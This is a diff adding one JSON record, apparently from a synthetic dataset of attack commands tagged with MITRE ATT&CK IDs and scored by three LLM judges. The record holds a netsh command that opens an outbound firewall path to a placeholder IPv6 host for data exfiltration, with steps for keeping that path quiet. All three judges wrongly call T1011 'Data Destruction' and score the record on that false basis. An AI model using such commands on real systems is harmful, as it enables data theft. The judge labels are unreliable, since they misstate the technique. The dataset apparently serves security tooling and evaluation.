@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh advfirewall firewall add rule name=\"exfil_out_tcp6_49444\" dir=out action=allow enable=yes protocol=TCP remoteport=49444 remoteip=2001:db8:bad:cafe::44 profile=any",
+  "explanation": "Adds a narrowly scoped outbound firewall rule to allow IPv6 TCP egress to a specific high port/host used for alternate-medium exfiltration (T1011).",
+  "rationale_steps": [
+    "Open only the exact IPv6 destination and high TCP port needed for exfiltration.",
+    "Minimize side effects by scoping to a single remote IP and port.",
+    "Permit exfil over a non-standard IPv6 path unlikely to be blocked by default."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-53a96244",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax for the netsh advfirewall firewall add rule command, including correctly formatted parameters, balanced quotes, and valid flag formats.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly creates a firewall rule that could be used for exfiltration, it aligns more with Command and Control (C2) channel establishment rather than the claimed Data Destruction (T1011) technique, showing a mismatch between the command's function and the stated MITRE technique.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:43:11.875210Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct `netsh` syntax, valid parameters, balanced quoting, and a proper IPv6 address.",
+        "semantic_score": 1,
+        "semantic_justification": "The command adds a firewall rule for network access, which is not aligned with T1011 (Data Destruction); the explanation incorrectly links exfiltration to T1011.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:43:22.985372Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid netsh advfirewall syntax with balanced quoting and supported parameters for adding an outbound rule.",
+        "semantic_score": 2,
+        "semantic_justification": "While it would create the intended IPv6 TCP egress allow rule if run with administrative privileges, the provided context lists no privilege and the action is unrelated to the given Data Destruction technique description.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T01:43:54.130777Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
